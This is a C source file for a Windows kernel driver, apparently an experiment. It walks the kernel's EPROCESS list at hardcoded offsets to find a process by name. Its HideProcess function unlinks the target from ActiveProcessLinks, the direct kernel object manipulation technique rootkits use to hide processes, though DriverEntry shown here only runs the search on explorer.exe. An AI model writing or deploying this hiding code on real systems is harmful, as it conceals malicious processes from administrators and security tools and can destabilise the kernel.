
#include <ntifs.h>

#include <ntddk.h>
#include <wdf.h>
#include <stdlib.h>

#pragma warning (disable : 4100 )

DRIVER_INITIALIZE DriverEntry;

typedef unsigned long       DWORD;

void OnUnload(IN PDRIVER_OBJECT DriverObject) {
    DbgPrintEx(0, 0, "Bye Bye !!!\n");
}
//https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm
//Windows ActiveProcessLinks offset:0x448
//Windows Flink offset:0x0 gvf
//Windows Blink offset:0x8
int GetImageFileNameOffset(char* name) {
    PEPROCESS currentproc = PsGetCurrentProcess();
    for (int i = 0; i < PAGE_SIZE; i++)
    {

        if (strncmp(name, (char*)currentproc + i, strlen(name))==0){
            return i;
        }
    }
    DbgPrintEx(0, 0, "Process not found...\n");
    return -1;
}
int SearchEPROCESSbyOffset(int offset, char *target) {
    PEPROCESS currentproc = PsGetCurrentProcess();
    DbgPrintEx(0, 0, "ImageFileName: %s\n", (unsigned char*)((unsigned char*)currentproc + offset));
    PLIST_ENTRY listentry = (LIST_ENTRY*)((unsigned char*)currentproc+0x448);
    listentry = listentry->Flink;
    PEPROCESS process = (PEPROCESS)((unsigned char*)listentry - 0x448);//getting EPROCESS from LIST_ENTRY
    char *name = (char*)((unsigned char*)process + offset);

    while (strcmp(name, "System") != 0){
        
        process = (PEPROCESS)((unsigned char*)listentry - 0x448);//getting EPROCESS from LIST_ENTRY
        name = (char*)((unsigned char*)process + offset);
        DbgPrintEx(0, 0, "Process name: %s\n", name);
        listentry = listentry->Flink;
        if (strcmp(name, target) == 0) {
            int pid = *(int*)((unsigned char*)process + 0x440);
            DbgPrintEx(0, 0, "PID: %d\n", pid);
            return pid;
        }
    }

    return -1;
}
int HideProcess(int targetPID) {
    PEPROCESS pidEPROCESS;
    NTSTATUS result = PsLookupProcessByProcessId((HANDLE)targetPID,&pidEPROCESS);
    
    if (result == STATUS_INVALID_PARAMETER) {
        DbgPrint("An invalid parameter was passed to a service or function. (PID not found) (0xC000000D)");
        return -1;
    }
    else if (result == STATUS_INVALID_CID) {
        DbgPrint("An invalid client ID was specified. (0x0xC000000B)");
        return -1;
    }
    if (result != STATUS_SUCCESS) {
        DbgPrint("Unknow PsLookupProcessByProcessId error !!!");
    }
    PLIST_ENTRY ActiveProcessLinks;
    ActiveProcessLinks = (PLIST_ENTRY)((unsigned char *)pidEPROCESS + 0x448);//pourquoi char*, je ne saurais peut être jamais
    ActiveProcessLinks->Flink->Blink = ActiveProcessLinks->Blink;
    ActiveProcessLinks->Blink->Flink = ActiveProcessLinks->Flink;
    ActiveProcessLinks->Flink = NULL;
    ActiveProcessLinks->Blink = NULL;

    //now hiding the process
    DbgPrint("Process is now hidden...");
    return 1;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
    // NTSTATUS variable to record success or failure
    DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
    DriverObject->DriverUnload = OnUnload;
    ;
    SearchEPROCESSbyOffset(GetImageFileNameOffset("System"), "explorer.exe");
    return STATUS_SUCCESS;
}